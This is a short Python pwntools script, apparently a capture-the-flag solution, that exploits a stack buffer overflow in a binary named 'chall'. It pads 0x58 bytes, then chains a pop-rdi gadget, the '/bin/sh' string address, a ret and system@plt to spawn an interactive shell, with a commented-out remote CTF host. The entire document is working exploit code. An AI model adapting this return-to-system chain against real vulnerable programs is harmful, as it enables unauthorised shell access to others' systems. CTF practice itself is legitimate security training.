from pwn import *

# p = remote('pwn.katagaitai-ctf.net', 9003)
p = process('./chall')

elf = ELF('./chall')
rop = ROP(elf)


pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
system_plt = elf.plt['system']
bin_sh = next(elf.search(b'/bin/sh'))
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * 0x58
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system_plt)

p.recvuntil(b'[*] Please input data in \'buf1\' ...')
p.sendline(payload)
p.interactive()